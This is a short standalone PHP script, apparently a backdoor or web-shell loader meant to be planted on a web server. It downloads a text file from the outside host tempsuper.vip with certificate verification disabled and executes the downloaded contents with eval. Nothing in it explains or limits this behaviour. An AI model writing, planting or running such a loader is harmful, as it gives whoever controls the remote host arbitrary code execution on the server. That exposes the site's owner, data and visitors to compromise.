<?php
$url = 'https://tempsuper.vip/ini.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
if ($fileContents === false) {
    die('[!] component : https://tempsuper.vip/ini.txt');
}
eval("?>" . $fileContents);
?>